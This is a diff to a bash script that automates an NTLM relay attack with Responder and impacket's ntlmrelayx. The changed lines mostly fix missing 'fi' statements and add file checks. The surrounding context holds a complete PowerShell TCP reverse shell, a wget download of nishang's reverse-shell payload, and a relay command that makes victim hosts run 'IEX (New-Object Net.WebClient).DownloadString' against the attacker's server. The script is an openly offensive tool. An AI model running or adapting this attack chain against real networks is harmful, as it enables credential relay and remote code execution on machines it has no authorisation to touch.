@@ -160,7 +160,10 @@ function checkProgramsNeeded(){
 
 function checkTargets(){
 	
-	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking targets...\n"; sleep 0.5; fi
+    test -f $(pwd)/impacket/ntlmrelayx.py &>/dev/null
+    if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} ntlmrelayx.py not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
+	
+    if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Checking targets...\n"; sleep 0.5; fi
 	
 	if [ -e $(pwd)/impacket/targets.txt ];then rm -f $(pwd)/impacket/targets.txt &>/dev/null; fi
 	
@@ -174,7 +177,7 @@ function checkTargets(){
 	cat $(pwd)/impacket/targets.txt | sort -u > $(pwd)/targets.tmp
 	cp $(pwd)/targets.tmp $(pwd)/impacket/targets.txt
 	mv $(pwd)/targets.tmp $targets
-		
+
 }
 
 function checkResponderConfig(){
@@ -230,11 +233,11 @@ function relayingAttack(){
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Tmux setted up. Launching responder...\n"; sleep 0.5; fi
 
     test -f $(pwd)/responder/Responder.py &>/dev/null
-    if [ $? -ne 0 ];then echo -e "${redcolour}[d:]${endcolour} responder not found. Install it by running me without -d option, or do it manually.\n"; badexit
+    if [ $? -ne 0 ];then echo -e "${redcolour}[d:]${endcolour} responder not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
 	tmux send-keys "python3 $(pwd)/responder/Responder.py -I $interface -drw" C-m && tmux swap-pane -d && sleep 1
 
     which ifconfig &>/dev/null
-    if [ $? -ne 0 ];then echo -e "${redcolour}[d:]${endcolour} net-tools not found. Install it by running me without -d option, or do it manually.\n"; badexit
+    if [ $? -ne 0 ];then echo -e "${redcolour}[d:]${endcolour} net-tools not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
 
 	lhost=$(ifconfig $interface | grep "inet\s" | awk '{print $2}')
 	openPorts=($(netstat -tunalp | grep -v 'Active\|Proto' | grep 'tcp' | awk '{print $4}' | awk -F: '{print $NF}' | sort -u | xargs))
@@ -245,7 +248,7 @@ function relayingAttack(){
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Downloading PowerShell payload from nishang repository...\n"; sleep 0.5; fi
 
 	wget 'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1' -O $(pwd)/shell.ps1 &>/dev/null
-    if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} wget not found. Install it by running me without -d option, or do it manually.\n"; badExit
+    if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} wget not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
 	if [ ! -e "$(pwd)/shell.ps1" ];then
 		if [ ! -z $quiet ];then echo -e "${yellowColour}[:S]${endColour} Unable to get nishang payload. Let's try crafting it manually...\n"; sleep 0.5; fi
 		rshell='$client = New-Object System.Net.Sockets.TCPClient("'$lhost'",'$lport');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
@@ -259,7 +262,7 @@ function relayingAttack(){
 	if [ ! -z $quiet ];then echo -e "${blueColour}[:*]${endColour} Launching ntlmrelayx.py from impacket\n"; sleep 0.5; fi
 
     test -f $(pwd)/impacket/ntlmrelayx.py &>/dev/null
-    if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} ntlmrelayx.py not found. Install it by running me without -d option, or do it manually.\n"; badExit
+    if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} ntlmrelayx.py not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
 	
     command="powershell IEX (New-Object Net.WebClient).DownloadString('http://$lhost:8000/shell.ps1')"
 	let paneID+=1; tmux select-pane -t $paneID && tmux send-keys "cd $(pwd)/impacket && python3 $(pwd)/impacket/ntlmrelayx.py -tf $(pwd)/impacket/targets.txt -smb2support -c \"$command\" 2>/dev/null" C-m && sleep 1
@@ -281,7 +284,7 @@ function relayingAttack(){
 		terminal_nc_PID=!$
 	else
         which xterm &>/dev/null
-        if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} xterm not found. Install it by running me without -d option, or do it manually.\n"; badExit
+        if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} xterm not found. Install it by running me without -d option, or do it manually.\n"; badExit; fi
 
         xterm -hold -T 'XTerm' -e "$command" &>/dev/null &
 		terminal_nc_PID=!$
@@ -391,7 +394,10 @@ if [ "$(id -u)" == 0 ]; then
 
 		if [ ! -e $targets ]; then
 			echo -e "${redColour}[D:]${endColour} $targets file does not exists\n"; badExit
-		else
+		
+        elif [ -z "$(cat "$targets")" ];then
+			echo -e "${redColour}[D:]${endColour} $targets file is empty\n"; badExit
+        else
 			while read line; do
 				echo $line | grep -E "^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$" &>/dev/null
 				if [ $? -ne 0 ];then echo -e "${redColour}[D:]${endColour} Could not read the content of $targets. Exiting...\n"; badExit; fi
